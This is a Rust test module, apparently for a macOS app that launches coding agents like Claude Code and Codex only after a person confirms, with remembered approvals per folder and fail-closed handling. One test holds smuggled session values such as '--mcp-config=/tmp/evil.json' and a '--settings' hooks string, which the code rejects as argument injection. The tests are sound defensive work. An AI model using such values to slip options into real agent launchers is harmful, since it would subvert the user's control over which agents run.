        assert_eq!(asked[0].allow, "Run Claude Code");
        assert!(rig.jobs_on_disk().jobs.is_empty(), "nothing recorded");
        assert!(rig.rec.events.lock().unwrap().is_empty(), "nothing ran");

        assert!(rig.on_disk().worker_folders.is_empty(), "a no is never remembered");

        // A yes (once the no's hold-off is over): it runs, with no banner, and
        // is remembered for Claude Code in this folder, by its realpath.
        past_the_backoff().await;
        let id = rig.svc.start_with(args, rig.launch.clone()).await.unwrap().job_id;
        assert_eq!(rig.given(&id, 0).await["script"], "acp.sh");
        assert!(rig.rec.notices.lock().unwrap().is_empty());
        assert_eq!(
            rig.on_disk().worker_folders,
            vec![serde_json::json!({ "worker": "claude-code", "folder": folder })]
        );
        // Its resume asks nothing, and tells nothing new (told within the day).
        rig.waiting(&id).await;
        rig.svc.stop(id.clone()).await.unwrap();
        rig.exit_of(&id).await;
        rig.resume(&id).await.unwrap();
        assert_eq!(rig.given(&id, 1).await["script"], "acp.sh");
        assert_eq!(rig.rec.asked.lock().unwrap().len(), 2);
        assert!(rig.rec.notices.lock().unwrap().is_empty());
        // A new job there, read or edit alike, asks nothing: it is told, naming the agent.
        let next = rig.start(Some("claude-code")).await.unwrap();
        assert_eq!(rig.given(&next, 0).await["worker"], "claude-code");
        assert_eq!(rig.rec.asked.lock().unwrap().len(), 2, "not asked again");
        assert_eq!(
            rig.rec.notices.lock().unwrap()[0].0,
            "Claude Code started in project for Native Intelligence"
        );
        // eve's jobs aren't asked; the person is told instead.
        let eve = rig.start(None).await.unwrap();
        rig.waiting(&eve).await;
        assert_eq!(rig.rec.asked.lock().unwrap().len(), 2);
        assert_eq!(rig.rec.notices.lock().unwrap().len(), 2);
        assert_eq!(rig.rec.notices.lock().unwrap()[1].0, "Agent started in project");
    }

    #[tokio::test]
    async fn a_worker_confirm_nobody_answers_is_a_no_and_one_is_up_at_a_time() {
        let rig = rig().await;
        rig.found(vec![], &["claude-code"]).await;
        rig.svc.allow_worker("claude-code".into(), true).await.unwrap();
        rig.rec.hold.store(true, Ordering::SeqCst);
        let meanwhile = async {
            let deadline = tokio::time::Instant::now() + Duration::from_secs(5);
            let asking = |v: &TrayView| v.jobs.iter().any(|j| j.state == super::super::TrayJobState::Asking);
            while !rig.rec.last_tray().is_some_and(|v| asking(&v)) {
                assert!(tokio::time::Instant::now() < deadline, "the tray never said it waits for the person");
                tokio::time::sleep(Duration::from_millis(10)).await;
            }
            // Another worker's start is refused while the confirm is up; eve's isn't.
            let worker = rig.start(Some("claude-code")).await;
            let eve = rig.start(None).await;
            (worker, eve)
        };
        let (first, (second, eve)) = tokio::join!(rig.start(Some("claude-code")), meanwhile);
        assert_eq!(second.unwrap_err(), super::super::starts::ONE_CONFIRM);
        assert!(eve.is_ok(), "{eve:?}");
        assert_eq!(
            first.unwrap_err(),
            "Claude Code didn't run: nobody answered on this Mac within 1 s"
        );
        assert_eq!(rig.rec.asked.lock().unwrap().len(), 1);
        let jobs = rig.jobs_on_disk().jobs;
        assert_eq!(jobs.len(), 1, "only eve's job: {jobs:?}");
        assert_eq!(jobs[0].worker, None);
        // The slot is free again: once the hold-off is over, the next is asked.
        rig.rec.hold.store(false, Ordering::SeqCst);
        past_the_backoff().await;
        rig.start(Some("claude-code")).await.unwrap();
        assert_eq!(rig.rec.asked.lock().unwrap().len(), 2);
    }

    #[tokio::test]
    async fn a_stop_while_the_person_is_asked_wins_over_their_yes() {
        let rig = rig().await;
        rig.found(vec![], &["claude-code"]).await;
        rig.svc.allow_worker("claude-code".into(), true).await.unwrap();
        rig.rec.hold.store(true, Ordering::SeqCst);
        let id = uuid::Uuid::new_v4().to_string();
        let args = StartArgs {
            job_id: Some(id.clone()),
            ..rig.args(Some("claude-code"))
        };
        let meanwhile = async {
            let deadline = tokio::time::Instant::now() + Duration::from_secs(5);
            while rig.rec.open.lock().unwrap().is_empty() {
                assert!(tokio::time::Instant::now() < deadline, "never asked");
                tokio::time::sleep(Duration::from_millis(10)).await;
            }
            rig.svc.stop(id.clone()).await.unwrap();
            let yes = rig.rec.open.lock().unwrap().pop().unwrap();
            let _ = yes.send(true);
        };
        let (started, ()) = tokio::join!(rig.svc.start_with(args, rig.launch.clone()), meanwhile);
        assert_eq!(started.unwrap_err(), "stopped before it started");
        assert!(rig.jobs_on_disk().jobs.is_empty() && rig.rec.events.lock().unwrap().is_empty());
        // The person did say yes, and the agent is still on: remembered.
        assert_eq!(rig.on_disk().worker_folders.len(), 1);
    }

    #[tokio::test]
    async fn a_yes_after_the_agent_was_switched_off_is_not_remembered() {
        let rig = rig().await;
        rig.found(vec![], &["claude-code"]).await;
        rig.svc.allow_worker("claude-code".into(), true).await.unwrap();
        rig.rec.hold.store(true, Ordering::SeqCst);
        let meanwhile = async {
            let deadline = tokio::time::Instant::now() + Duration::from_secs(5);
            while rig.rec.open.lock().unwrap().is_empty() {
                assert!(tokio::time::Instant::now() < deadline, "never asked");
                tokio::time::sleep(Duration::from_millis(10)).await;
            }
            // Switched off in the menu bar while the confirm is up, then "Run".
            rig.svc.allow_worker("claude-code".into(), false).await.unwrap();
            let yes = rig.rec.open.lock().unwrap().pop().unwrap();
            let _ = yes.send(true);
        };
        let (started, ()) = tokio::join!(rig.start(Some("claude-code")), meanwhile);
        assert!(started.is_err(), "it doesn't run");
        assert!(rig.on_disk().worker_folders.is_empty(), "and the folder isn't brought back");
        rig.rec.hold.store(false, Ordering::SeqCst);
        rig.svc.allow_worker("claude-code".into(), true).await.unwrap();
        rig.start(Some("claude-code")).await.unwrap();
        assert_eq!(rig.rec.asked.lock().unwrap().len(), 2, "switched on again: asked afresh");
    }

    #[tokio::test]
    async fn switching_off_holds_even_when_it_cant_be_saved() {
        let rig = rig().await;
        rig.found(vec![], &["claude-code"]).await;
        rig.svc.allow_worker("claude-code".into(), true).await.unwrap();
        let id = rig.start(Some("claude-code")).await.unwrap();
        rig.waiting(&id).await;
        // The save's temp file can't be written: a folder is in its place.
        std::fs::create_dir_all(rig.base.join("data/local-agent").join(format!("{STORE_FILE}.tmp"))).unwrap();
        rig.svc.allow_worker("claude-code".into(), false).await.unwrap();
        let view = rig.svc.models().await.unwrap();
        assert!(!view.worker_allowed("claude-code"), "off, in memory");
        assert_eq!(rig.on_disk().allowed_workers, ["claude-code"], "on disk as it was");
        rig.exit_of(&id).await;
        assert!(rig.start(Some("claude-code")).await.unwrap_err().contains("isn't allowed on this Mac"));
        // Switching on fails closed.
        assert!(rig.svc.allow_worker("claude-code".into(), true).await.is_err());
        assert!(!rig.svc.models().await.unwrap().worker_allowed("claude-code"));
    }

    #[tokio::test]
    async fn worker_folders_that_arent_a_list_fail_closed() {
        let mut rig = rig_with(Some(r#"{"allowedWorkers":["claude-code"],"workerFolders":5}"#));
        rig.grant = rig.svc.add_grant(rig.base.join("home/project"), GrantMode::Read).await.unwrap().id;
        rig.found(vec![], &["claude-code"]).await;
        assert!(rig.svc.status().await.unwrap().workers.is_empty(), "nothing allowed");
        assert!(rig.start(Some("claude-code")).await.is_err());
        assert!(rig.rec.asked.lock().unwrap().is_empty() && rig.rec.events.lock().unwrap().is_empty(), "nothing ran");
    }

    async fn snapshot_job(rig: &Rig, id: &str) -> Option<super::super::JobSummary> {
        let snap = rig.svc.ask(|reply| super::super::Cmd::Snapshot { reply }).await.unwrap();
        snap.jobs.into_iter().find(|j| j.id == id)
    }

    #[tokio::test]
    async fn a_worker_takes_follow_ups_for_as_long_as_it_lives_and_its_revival_isnt_asked() {
        let mut rig = rig_tuned(None, |t| t.idle_check_every = Duration::from_secs(3600));
        rig.grant = rig.svc.add_grant(rig.base.join("home/project"), GrantMode::Read).await.unwrap().id;
        rig.found(vec![], &["claude-code"]).await;
        rig.svc.allow_worker("claude-code".into(), true).await.unwrap();
        let id = rig.start(Some("claude-code")).await.unwrap();
        rig.waiting(&id).await;
        tokio::time::sleep(Duration::from_millis(300)).await;
        rig.svc.send(id.clone(), "and the docs".into(), "queue".into()).await.unwrap();
        rig.rec
            .wait_for("the follow-up", |e| e.job_id == id && e.event["text"] == "ran and the docs")
            .await;
        // Parked (idle, or the app quit): the message that revives it runs, unasked.
        rig.svc.stop(id.clone()).await.unwrap();
        rig.exit_of(&id).await;
        let message = super::super::ResumeMessage {
            text: "now the tests".into(),
            policy: "queue".into(),
        };
        rig.svc
            .resume_as(id.clone(), Some(TOKEN.into()), None, Some(message), rig.launch.clone())
            .await
            .unwrap();
        rig.rec
            .wait_for("the revived message", |e| e.job_id == id && e.event["text"] == "ran now the tests")
            .await;
        assert_eq!(rig.rec.asked.lock().unwrap().len(), 1, "asked once, at its first launch");
        assert!(rig.rec.notices.lock().unwrap().is_empty(), "confirmed, then a revival: never bannered");
    }

    #[tokio::test]
    async fn a_yes_is_for_that_agent_in_that_folder_only() {
        let rig = rig().await;
        let sub = rig.base.join("home/project/sub");
        let sibling = rig.base.join("home/other");
        std::fs::create_dir_all(&sub).unwrap();
        std::fs::create_dir_all(&sibling).unwrap();
        let sub = rig.svc.add_grant(sub, GrantMode::Read).await.unwrap().id;
        let sibling = rig.svc.add_grant(sibling, GrantMode::Read).await.unwrap().id;
        rig.found(vec![], &["claude-code", "codex"]).await;
        rig.svc.allow_worker("claude-code".into(), true).await.unwrap();
        rig.svc.allow_worker("codex".into(), true).await.unwrap();
        rig.start(Some("claude-code")).await.unwrap();
        assert_eq!(rig.rec.asked.lock().unwrap().len(), 1);
        rig.start(Some("claude-code")).await.unwrap();
        assert_eq!(rig.rec.asked.lock().unwrap().len(), 1, "same agent, same folder: not asked");
        // Another agent in the same folder is asked.
        rig.start(Some("codex")).await.unwrap();
        assert_eq!(rig.rec.asked.lock().unwrap().len(), 2);
        assert_eq!(rig.rec.asked.lock().unwrap()[1].title, "Let Codex work in project?");
        // A sub-folder, and another folder, are asked.
        for grant in [sub, sibling] {
            let args = StartArgs {
                grant_id: grant,
                ..rig.args(Some("claude-code"))
            };
            rig.svc.start_with(args, rig.launch.clone()).await.unwrap();
        }
        assert_eq!(rig.rec.asked.lock().unwrap().len(), 4);
    }

    #[tokio::test]
    async fn switching_a_worker_off_forgets_its_folders() {
        let rig = rig().await;
        rig.found(vec![], &["claude-code", "codex"]).await;
        rig.svc.allow_worker("claude-code".into(), true).await.unwrap();
        rig.svc.allow_worker("codex".into(), true).await.unwrap();
        let first = rig.start(Some("claude-code")).await.unwrap();
        rig.start(Some("codex")).await.unwrap();
        assert_eq!(rig.on_disk().worker_folders.len(), 2);
        rig.waiting(&first).await;
        rig.svc.allow_worker("claude-code".into(), false).await.unwrap();
        let folders = rig.on_disk().worker_folders;
        assert_eq!(folders.len(), 1, "Codex's yes stays: {folders:?}");
        assert_eq!(folders[0]["worker"], "codex");
        rig.svc.allow_worker("claude-code".into(), true).await.unwrap();
        rig.start(Some("claude-code")).await.unwrap();
        assert_eq!(rig.rec.asked.lock().unwrap().len(), 3, "switched on again: asked afresh");
    }

    #[tokio::test]
    async fn a_remembered_yes_survives_a_relaunch_and_odd_entries_grant_nothing() {
        let mut rig = rig_with(Some(
            r#"{"allowedWorkers":["claude-code","codex"],"workerFolders":[
                {"worker":"claude-code","folder":"{base}/home/project"},
                {"worker":"Codex","folder":"{base}/home/project"},
                {"worker":"codex","folder":"home/project"},
                {"worker":"codex","folder":"{base}/home/x/../project"},
                {"worker":"codex"},
                "junk",
                7
            ]}"#,
        ));
        rig.grant = rig.svc.add_grant(rig.base.join("home/project"), GrantMode::Read).await.unwrap().id;
        rig.found(vec![], &["claude-code", "codex"]).await;
        rig.start(Some("claude-code")).await.unwrap();
        assert!(rig.rec.asked.lock().unwrap().is_empty(), "the yes from before the relaunch counts");
        assert_eq!(rig.rec.notices.lock().unwrap()[0].0, "Claude Code started in project for Native Intelligence");
        rig.start(Some("codex")).await.unwrap();
        assert_eq!(rig.rec.asked.lock().unwrap().len(), 1, "no odd entry is a yes for Codex");
        assert_eq!(rig.on_disk().worker_folders.len(), 8, "odd entries are kept as they are, never dropped or used");
    }

    #[test]
    fn a_remembered_folder_is_a_realpath_and_a_link_put_in_its_place_isnt_it() {
        let dir = tempfile::tempdir().unwrap();
        let base = std::fs::canonicalize(dir.path()).unwrap();
        let site = base.join("site");
        std::fs::create_dir_all(&site).unwrap();
        let site_s = site.to_str().unwrap();
        assert_eq!(yes_folder(site_s).as_deref(), Some(site_s));
        // A link to it is not the folder a grant names (grants are realpaths).
        let link = base.join("link");
        std::os::unix::fs::symlink(&site, &link).unwrap();
        assert_eq!(yes_folder(link.to_str().unwrap()), None);
        // Deleted and made again at the same path: the yes is for the path,
        // so it still holds (by design).
        let kept = Stored {
            allowed_workers: vec!["claude-code".into()],
            worker_folders: vec![serde_json::json!({ "worker": "claude-code", "folder": site_s })],
            ..Stored::default()
        };
        std::fs::remove_dir_all(&site).unwrap();
        std::fs::create_dir_all(&site).unwrap();
        assert!(yes_folder(site_s).is_some_and(|f| kept.remembers("claude-code", &f)));
        // The folder replaced by a link to somewhere else after the yes.
        let elsewhere = base.join("elsewhere");
        std::fs::create_dir_all(&elsewhere).unwrap();
        std::fs::rename(&site, base.join("site-old")).unwrap();
        std::os::unix::fs::symlink(&elsewhere, &site).unwrap();
        assert_eq!(yes_folder(site_s), None, "now resolves elsewhere: no yes");
        let stored = Stored {
            allowed_workers: vec!["claude-code".into()],
            worker_folders: vec![serde_json::json!({ "worker": "claude-code", "folder": site_s })],
            ..Stored::default()
        };
        assert!(stored.remembers("claude-code", site_s));
        assert!(!stored.remembers("codex", site_s), "bound to the worker id");
        assert!(!stored.remembers("claude-code", &format!("{site_s}/sub")), "not a sub-folder");
        assert!(!stored.remembers("claude-code", base.to_str().unwrap()), "not a parent");
        for odd in [
            serde_json::json!({ "worker": "claude-code", "folder": "relative/site" }),
            serde_json::json!({ "worker": "claude-code", "folder": format!("{site_s}/../site") }),
            serde_json::json!({ "worker": "claude-code", "folder": format!("{site_s}/./x") }),
            serde_json::json!({ "worker": "Claude Code", "folder": site_s }),
            serde_json::json!({ "worker": "claude-code", "folder": 7 }),
            serde_json::json!({ "folder": site_s }),
            serde_json::json!(["claude-code", site_s]),
            serde_json::json!(null),
        ] {
            assert_eq!(remembered_yes(&odd), None, "{odd}");
        }
    }

    #[tokio::test]
    async fn after_a_no_the_folder_isnt_asked_again_for_a_while() {
        let rig = rig().await;
        std::fs::create_dir_all(rig.base.join("home/other")).unwrap();
        let other = rig.svc.add_grant(rig.base.join("home/other"), GrantMode::Read).await.unwrap().id;
        rig.found(vec![], &["claude-code"]).await;
        rig.svc.allow_worker("claude-code".into(), true).await.unwrap();
        rig.rec.answers.lock().unwrap().push_back(false);
        assert_eq!(rig.start(Some("claude-code")).await.unwrap_err(), SAID_NO);
        let err = rig.start(Some("claude-code")).await.unwrap_err();
        assert!(
            err.starts_with(
                "a coding agent wasn't allowed in this folder on this Mac a few minutes ago, so this didn't run and \
                 won't be tried again"
            ),
            "{err}"
        );
        assert_eq!(rig.rec.asked.lock().unwrap().len(), 1, "not asked again");
        // Another folder is asked; eve's jobs aren't held off at all.
        let elsewhere = StartArgs {
            grant_id: other,
            ..rig.args(Some("claude-code"))
        };
        rig.svc.start_with(elsewhere, rig.launch.clone()).await.unwrap();
        rig.start(None).await.unwrap();
        assert_eq!(rig.rec.asked.lock().unwrap().len(), 2);
        past_the_backoff().await;
        rig.start(Some("claude-code")).await.unwrap();
        assert_eq!(rig.rec.asked.lock().unwrap().len(), 3);
    }

    #[tokio::test]
    async fn a_job_waiting_on_its_confirm_is_reported_live() {
        let rig = rig().await;
        rig.found(vec![], &["claude-code"]).await;
        rig.svc.allow_worker("claude-code".into(), true).await.unwrap();
        rig.rec.hold.store(true, Ordering::SeqCst);
        let id = uuid::Uuid::new_v4().to_string();
        let args = StartArgs {
            job_id: Some(id.clone()),
            ..rig.args(Some("claude-code"))
        };
        let meanwhile = async {
            let deadline = tokio::time::Instant::now() + Duration::from_secs(5);
            while rig.rec.open.lock().unwrap().is_empty() {
                assert!(tokio::time::Instant::now() < deadline, "never asked");
                tokio::time::sleep(Duration::from_millis(10)).await;
            }
            // A new job, with no record yet: the relay keeps its lease.
            let job = snapshot_job(&rig, &id).await.expect("listed while asked");
            let _ = rig.rec.open.lock().unwrap().pop().unwrap().send(true);
            job
        };
        let (started, job) = tokio::join!(rig.svc.start_with(args, rig.launch.clone()), meanwhile);
        started.unwrap();
        assert!(job.live && job.status == super::super::state::JobStatus::Starting, "{job:?}");
        assert_eq!((job.worker.as_deref(), job.request.as_str()), (Some("claude-code"), "fix the bug"));
        assert_eq!(snapshot_job(&rig, &id).await.unwrap().worker.as_deref(), Some("claude-code"));
    }

    #[test]
    fn lsof_lists_the_listening_pids() {
        assert_eq!(lsof_pids("p71655\nf3\np42\nf7\np42\nf9\n"), vec![42, 71655]);
        assert!(lsof_pids("").is_empty());
        assert!(lsof_pids("pnope\np0\nf3\n").is_empty());
    }

    #[test]
    fn each_server_is_known_by_its_port_and_its_makers_signature() {
        for s in LocalServer::ALL {
            assert!(s.base_url().contains(&format!(":{}/", s.port())), "{}", s.base_url());
            assert!(s
                .requirement()
                .starts_with("anchor apple generic and certificate leaf[subject.OU] = \""));
        }
        assert!(LocalServer::Ollama.requirement().ends_with("\"3MU9H2V9Y9\""));
        assert!(LocalServer::LmStudio.requirement().ends_with("\"D65G88RHWN\""));
    }

    #[tokio::test]
    async fn a_port_counts_only_while_whoever_listens_there_meets_the_requirement() {
        // This test binary listens: no maker's Developer ID, not even Apple's.
        let ours = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
        let port = ours.local_addr().unwrap().port();
        let refused = check_listener_on(port, "anchor apple").await.unwrap_err();
        assert_eq!(refused.note, NOT_SIGNED);
        assert!(refused.why.contains("isn't signed by the app's maker"), "{refused:?}");
        assert!(check_listener_on(port, LocalServer::Ollama.requirement()).await.is_err());
        drop(ours);
        let refused = check_listener_on(port, "anchor apple").await.unwrap_err();
        assert_eq!(refused.note, NOT_YOURS);
        assert!(refused.why.contains("no process of this user's listens"), "{refused:?}");
        // Apple's own nc meets `anchor apple`, and neither maker's.
        let mut nc = std::process::Command::new("/usr/bin/nc")
            .args(["-l", "127.0.0.1", &port.to_string()])
            .spawn()
            .unwrap();
        let deadline = std::time::Instant::now() + Duration::from_secs(10);
        while check_listener_on(port, "anchor apple").await.is_err() {
            assert!(std::time::Instant::now() < deadline, "nc never listened on {port}");
            tokio::time::sleep(Duration::from_millis(50)).await;
        }
        for s in LocalServer::ALL {
            assert!(check_listener_on(port, s.requirement()).await.is_err(), "{s:?}");
        }
        let _ = nc.kill();
        let _ = nc.wait();
    }

    /// Says a session that isn't a UUID.
    const BAD_SESSION_LINE: &str = r#"
read -r line
printf '{"type":"session","sessionId":"--last","streamIndex":0}\n'
printf '{"type":"event","event":{"kind":"status","status":"waiting"}}\n'
while IFS= read -r line; do case "$line" in *'"type":"stop"'*) exit 0;; esac; done
"#;

    #[tokio::test]
    async fn a_server_supplied_session_never_reaches_a_worker() {
        let rig = rig().await;
        rig.found(vec![], &["claude-code"]).await;
        rig.svc.allow_worker("claude-code".into(), true).await.unwrap();
        let with_resume = |id: Option<&str>, session: &str| StartArgs {
            job_id: id.map(str::to_string),
            resume: Some(super::super::ResumeArgs {
                eve_session_id: session.into(),
                stream_index: 0,
            }),
            ..rig.args(Some("claude-code"))
        };
        let upper = UUID.to_uppercase();
        for session in [
            "--settings={\"hooks\":{\"SessionStart\":[]}}",
            "--mcp-config=/tmp/evil.json",
            "-x",
            "--last",
            upper.as_str(),
            "not-a-uuid",
            UUID,
        ] {
            let err = rig
                .svc
                .start_with(with_resume(Some(&uuid::Uuid::new_v4().to_string()), session), rig.launch.clone())
                .await
                .unwrap_err();
            assert_eq!(err, FOREIGN_SESSION, "{session}");
        }
        assert!(rig.jobs_on_disk().jobs.is_empty() && rig.rec.events.lock().unwrap().is_empty());
        // An eve job keeps today's behaviour: the server's record is resumed.
        let eve = StartArgs {
            worker: None,
            ..with_resume(None, "--last")
        };
        rig.svc.start_with(eve, rig.launch.clone()).await.unwrap();

        // The session this Mac recorded (from the adapter's own line) is the one it resumes.
        let id = rig.start(Some("claude-code")).await.unwrap();
        rig.waiting(&id).await;
        rig.svc.stop(id.clone()).await.unwrap();
        rig.exit_of(&id).await;
        assert_eq!(rig.jobs_on_disk().job(&id).unwrap().session_id.as_deref(), Some(id.as_str()));
        let other = "11111111-2222-4333-8444-555555555555";
        assert_eq!(
            rig.svc.start_with(with_resume(Some(&id), other), rig.launch.clone()).await.unwrap_err(),
            FOREIGN_SESSION
        );
        rig.svc.start_with(with_resume(Some(&id), &id), rig.launch.clone()).await.unwrap();
        assert_eq!(rig.given(&id, 1).await["script"], "acp.sh");

        // An adapter's session outside the adapter's own rule is never recorded.
        std::fs::write(rig.base.join("agent/workers/acp.sh"), BAD_SESSION_LINE).unwrap();
        let bad = rig.start(Some("claude-code")).await.unwrap();
        rig.waiting(&bad).await;
        assert_eq!(rig.jobs_on_disk().job(&bad).unwrap().session_id, None);
    }

    #[tokio::test]
    async fn eve_jobs_still_run_the_launcher_on_the_relay() {
        let rig = rig().await;
        let id = rig.start(None).await.unwrap();
        let got = rig.given(&id, 0).await;
        assert_eq!(got["script"], "launcher.sh");
        assert_eq!(got["relay"], "https://nativeintelligence.test/api/local-agent/model");
        assert_eq!(got["token"], TOKEN);
        assert_eq!((got["worker"].as_str(), got["local"].as_str()), ("none", "none"));
        assert_eq!(rig.jobs_on_disk().job(&id).unwrap().worker, None);
    }

    #[tokio::test]
    async fn a_refused_worker_parks_nothing_and_makes_no_worktree() {
        let rig = rig().await;
        std::fs::remove_file(rig.base.join("bin/codex")).unwrap();
        rig.found(vec![], &["claude-code"]).await;
        rig.svc.allow_worker("codex".into(), true).await.unwrap();
        // Every slot holds an idle job: a start that went ahead would park one.
        for _ in 0..MAX_RUNNING {
            let id = rig.start(None).await.unwrap();
            rig.waiting(&id).await;
        }
        let err = rig.start(Some("codex")).await.unwrap_err();
        assert!(
            err.starts_with("Codex isn't installed on this Mac: there's no `codex` on your login shell's PATH."),
            "{err}"
        );
        assert!(err.contains("Native Intelligence doesn't install it"), "{err}");
        assert_eq!(
            rig.start(Some("cursor")).await.unwrap_err(),
            "worker must be one of \"claude-code\", \"codex\"",
            "an id the bundle's registry doesn't list"
        );
        assert_eq!(rig.start(Some("../codex")).await.unwrap_err(), "worker is not a coding agent's id");
        // An edit job's worktree isn't made for a refused start either.
        let repo = rig.base.join("home/repo");
        std::fs::create_dir_all(&repo).unwrap();
        let git = |args: &[&str]| {
            let ok = std::process::Command::new("/usr/bin/git")
                .args(args)
                .current_dir(&repo)
                .env("GIT_CONFIG_GLOBAL", "/dev/null")
                .env("GIT_CONFIG_NOSYSTEM", "1")
                .output()
                .unwrap()
                .status
                .success();
            assert!(ok, "git {args:?}");
        };
        git(&["init", "-q"]);
        git(&["-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "--allow-empty", "-m", "init"]);
        let grant = rig.svc.add_grant(repo, GrantMode::Edit).await.unwrap();
        assert_eq!(grant.mode, GrantMode::Edit);
        let edit = StartArgs {
            grant_id: grant.id,
            mode: Some("edit".into()),
            ..rig.args(Some("codex"))
        };
        assert!(rig.svc.start_with(edit, rig.launch.clone()).await.is_err());
        tokio::time::sleep(Duration::from_millis(200)).await;
        assert_eq!(rig.rec.parked(), 0, "no idle job was parked for it");
        assert!(!rig.base.join("home/.dial8/worktrees").exists(), "no worktree");
    }

    #[tokio::test]
    async fn a_bundle_without_the_capability_runs_neither() {
        let rig = rig().await;
        std::fs::write(rig.base.join("agent/BUNDLE.json"), r#"{"webCommit":"eecf7a3d4"}"#).unwrap();
        rig.found(vec![], &["claude-code"]).await;
        rig.svc.allow_worker("claude-code".into(), true).await.unwrap();
        assert_eq!(rig.start(Some("claude-code")).await.unwrap_err(), NO_WORKERS);
        std::fs::write(rig.base.join("agent/BUNDLE.json"), r#"{"capabilities":["workers"]}"#).unwrap();
        // Without any one of the adapter, the registry and the agents'
        // adapters, the capability is off.
        for gone in ["agent/workers/acp.sh", "agent/workers/registry.json", "agent/acp"] {
            let path = rig.base.join(gone);
            let aside = rig.base.join("aside");
            std::fs::rename(&path, &aside).unwrap();
            assert_eq!(rig.start(Some("claude-code")).await.unwrap_err(), NO_WORKERS, "without {gone}");
            std::fs::rename(&aside, &path).unwrap();
        }
        std::fs::write(rig.base.join("agent/workers/registry.json"), "{ not json").unwrap();
        assert_eq!(rig.start(Some("claude-code")).await.unwrap_err(), NO_WORKERS, "a broken registry");
        assert!(rig.rec.events.lock().unwrap().is_empty(), "nothing ran");
        // A local model chosen on a bundle that runs it, then an older bundle.
        std::fs::write(rig.base.join("agent/BUNDLE.json"), r#"{"capabilities":["local-model"]}"#).unwrap();
        rig.choose_local("llama3.1:8b").await;
        std::fs::write(rig.base.join("agent/BUNDLE.json"), "{}").unwrap();
        assert_eq!(rig.start(None).await.unwrap_err(), NO_LOCAL_SUPPORT, "never the relay instead");
        assert!(rig.jobs_on_disk().jobs.is_empty());
    }

    #[tokio::test]
    async fn the_model_is_set_from_what_rust_found_and_a_start_checks_its_server() {
        let rig = rig().await;
        let qwen = local(LocalServer::Ollama, "qwen2.5-coder:14b");
        assert_eq!(
            rig.svc.set_model(qwen.clone()).await,
            Err(NO_LOCAL_SUPPORT.into()),
            "Rust hasn't looked: no capability yet"
        );
        rig.found(vec![found(LocalServer::Ollama, true, &["llama3.1:8b"])], &[]).await;
        assert_eq!(
            rig.svc.set_model(qwen.clone()).await,
            Err("Ollama on this Mac doesn't list qwen2.5-coder:14b".into()),
            "a model can't be named out of thin air"
        );
        rig.choose_local("qwen2.5-coder:14b").await;
        assert_eq!(rig.on_disk().model, qwen.to_stored());
        let state = std::fs::read_to_string(rig.base.join("data/local-agent/state.json")).unwrap();
        assert!(!state.contains("qwen"), "model.json is where it lives: {state}");
        rig.svc.models().await.unwrap();
        let tray = rig.rec.last_tray().unwrap();
        assert!(tray.l4.model_shown());
        assert_eq!(tray.l4.model_title(), "Model: qwen2.5-coder:14b");

        // Its server went away: refused, and nothing ran (never the relay).
        rig.servers.lock().unwrap().clear();
        let looks = rig.looks.load(Ordering::SeqCst);
        assert_eq!(rig.start(None).await.unwrap_err(), LOCAL_DOWN);
        assert_eq!(rig.looks.load(Ordering::SeqCst), looks + 1, "the start looked");
        assert!(rig.jobs_on_disk().jobs.is_empty() && rig.rec.events.lock().unwrap().is_empty());

        *rig.servers.lock().unwrap() = vec![found(LocalServer::Ollama, true, &["qwen2.5-coder:14b"])];
        let id = rig.start(None).await.unwrap();
        let got = rig.given(&id, 0).await;
        assert_eq!(got["script"], "launcher.sh");
        assert_eq!(got["local"], "http://127.0.0.1:11434/v1");
        assert_eq!(got["id"], "qwen2.5-coder:14b");
        assert_eq!(got["relay"], "none", "no relay URL: fail closed");
        assert_eq!(got["token"], TOKEN, "the token stays, for the Native Intelligence tools");
        assert_eq!(got["origin"], "https://nativeintelligence.test");
        // A retried claim on the running job is a no-op: nothing is looked at.
        let looks = rig.looks.load(Ordering::SeqCst);
        let mut again = rig.args(None);
        again.job_id = Some(id.clone());
        rig.svc.start_with(again, rig.launch.clone()).await.unwrap();
        assert_eq!(rig.looks.load(Ordering::SeqCst), looks);

        // A resume checks again.
        rig.waiting(&id).await;
        rig.svc.stop(id.clone()).await.unwrap();
        rig.exit_of(&id).await;
        rig.servers.lock().unwrap().clear();
        assert_eq!(rig.resume(&id).await.unwrap_err(), LOCAL_DOWN);

        // A worker would send the folder to its vendor.
        rig.found(vec![], &["claude-code"]).await;
        rig.svc.allow_worker("claude-code".into(), true).await.unwrap();
        assert_eq!(
            rig.start(Some("claude-code")).await.unwrap_err(),
            "this Mac uses a local model: the model runs here, and Native Intelligence tools still go through Native Intelligence. To use \
             Claude Code, pick Native Intelligence in the menu bar's Local Agents → Model"
        );
        rig.svc.set_model(ModelChoice::Relay).await.unwrap();
        assert_eq!(rig.on_disk().model, None);
    }

    #[tokio::test]
    async fn the_status_says_only_whether_jobs_think_on_this_mac() {
        let rig = rig().await;
        let agent = PathBuf::from(&rig.launch.agent_dir);
        assert!(!rig.svc.uses_local_model(Some(&agent)).await, "the relay");
        rig.choose_local("llama3.1:8b").await;
        assert!(rig.svc.uses_local_model(Some(&agent)).await);
        assert!(!rig.svc.uses_local_model(None).await, "no bundle");
        std::fs::write(agent.join("BUNDLE.json"), r#"{"capabilities":["workers"]}"#).unwrap();
        assert!(!rig.svc.uses_local_model(Some(&agent)).await, "a bundle that can't run it: no job does");
        let status = serde_json::to_value(rig.svc.status().await.unwrap()).unwrap();
        assert_eq!(status["localModel"], false, "the test resolver has no bundle");
        assert!(!status.to_string().contains("llama"), "never which model");
    }

    #[tokio::test]
    async fn a_parked_relay_job_is_not_resumed_on_a_local_model() {
        let rig = rig().await;
        let relay = StartArgs {
            local_model: Some(false),
            ..rig.args(None)
        };
        let id = rig.svc.start_with(relay.clone(), rig.launch.clone()).await.unwrap().job_id;
        rig.waiting(&id).await;
        rig.svc.stop(id.clone()).await.unwrap();
        rig.exit_of(&id).await;
        rig.choose_local("llama3.1:8b").await;
        // The server recorded the relay for its session: refused, nothing runs.
        let before = rig.rec.events.lock().unwrap().len();
        assert_eq!(
            rig.svc
                .resume_as(id.clone(), Some(TOKEN.into()), Some(false), None, rig.launch.clone())
                .await
                .unwrap_err(),
            MODE_NOW_LOCAL
        );
        assert_eq!(rig.svc.start_with(relay, rig.launch.clone()).await.unwrap_err(), MODE_NOW_LOCAL);
        assert_eq!(rig.rec.events.lock().unwrap().len(), before, "nothing launched");
        // A job claimed on the local model runs on it.
        let local = StartArgs {
            local_model: Some(true),
            ..rig.args(None)
        };
        let id = rig.svc.start_with(local, rig.launch.clone()).await.unwrap().job_id;
